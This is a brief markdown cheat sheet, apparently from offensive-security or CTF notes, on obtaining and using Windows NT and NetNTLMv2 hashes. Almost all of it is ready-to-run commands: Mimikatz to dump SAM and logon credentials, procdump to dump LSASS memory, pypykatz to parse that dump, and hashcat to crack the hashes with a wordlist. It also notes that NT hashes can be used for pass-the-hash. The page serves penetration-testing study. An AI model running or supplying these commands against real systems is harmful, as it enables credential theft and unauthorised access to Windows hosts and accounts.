# NT hashes and NetNTLMv2

[← Windows quick reference](../04-windows-privesc.md)

NT hash: offline crack or Pass the Hash on NTLM service. NetNTLMv2: crack first; it is not passable.

Administrator/SYSTEM, non-interactive Mimikatz under WinRM:

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Requires process rights. Expect hashes more often than plaintext on patched hosts.

```bash
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

If LSASS minidump rights are available:

```powershell
procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```
